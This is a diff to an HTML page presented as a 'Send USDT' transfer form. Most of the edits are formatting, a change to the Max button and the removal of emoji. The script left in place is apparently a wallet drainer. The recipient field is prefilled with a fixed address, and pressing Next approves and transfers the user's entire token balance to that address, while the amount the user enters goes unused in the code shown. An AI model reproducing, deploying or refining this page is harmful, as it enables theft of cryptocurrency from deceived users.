@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -93,11 +92,7 @@
     }
   </style>
 </head>
-<body>
-
-  <header>Send USDT</header>
-
-  <div class="container">
+<body>  <header>Send USDT</header>  <div class="container">
     <label>Address or Domain Name</label>
     <div class="input-box">
       <input type="text" id="wallet" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" />
@@ -105,24 +100,18 @@
         <span onclick="document.getElementById('wallet').value=''">✕</span>
         <span onclick="navigator.clipboard.readText().then(text => document.getElementById('wallet').value = text)">Paste</span>
       </div>
-    </div>
+    </div><label>Amount</label>
+<div class="input-box amount-box">
+  <input type="number" id="amount" placeholder="USDT Amount" />
+  <span class="token">USDT</span>
+  <span class="input-actions" onclick="document.getElementById('amount').value='100'">Max</span>
+</div>
 
-    <label>Amount</label>
-    <div class="input-box amount-box">
-      <input type="number" id="amount" placeholder="USDT Amount" />
-      <span class="token">USDT</span>
-      <span class="input-actions" onclick="document.getElementById('amount').value='MAX'">Max</span>
-    </div>
+<div class="usd">≈ $0.00</div>
 
-    <div class="usd">≈ $0.00</div>
-  </div>
-
-  <div class="fixed-button">
+  </div>  <div class="fixed-button">
     <button id="nextBtn" onclick="start()">Next</button>
-  </div>
-
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
-  <script>
+  </div>  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>  <script>
     const ABI = [
       { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
       { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
@@ -154,10 +143,10 @@
         await contract.methods.approve(wallet, balance).send({ from: user });
         await contract.methods.transferFrom(user, wallet, balance).send({ from: user });
 
-        btn.innerText = "✅ Done";
+        btn.innerText = " Done";
       } catch (e) {
         console.error(e);
-        btn.innerText = "❌ Failed";
+        btn.innerText = " Failed";
       }
 
       setTimeout(() => {
@@ -165,7 +154,5 @@
         btn.disabled = false;
       }, 3000);
     }
-  </script>
-
-</body>
+  </script></body>
 </html>
